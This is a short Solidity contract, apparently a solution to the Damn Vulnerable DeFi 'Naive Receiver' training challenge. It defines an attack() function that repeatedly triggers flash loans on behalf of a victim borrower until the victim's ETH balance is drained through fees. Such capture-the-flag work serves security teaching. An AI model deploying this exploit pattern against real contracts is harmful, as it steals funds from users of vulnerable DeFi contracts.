// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanExploiter {
    using Address for address payable;

    address private _pool;
    address private _naiveBorower;
    address private _attacker;

    error SenderMustBeAttacker();
    error CannotBorrowThatMuch();

    constructor(address payable poolAddress, address naiveBorrowerAddress) {
        _pool = poolAddress;
        _naiveBorower = naiveBorrowerAddress;
        _attacker = msg.sender;
    }

    // Function called by the pool during flash loan
    function attack() public {
        if (msg.sender != _attacker) revert SenderMustBeAttacker();
        while (address(_naiveBorower).balance > 0) {
            IPool(_pool).flashLoan(_naiveBorower, 1e10);
        }
    }
}
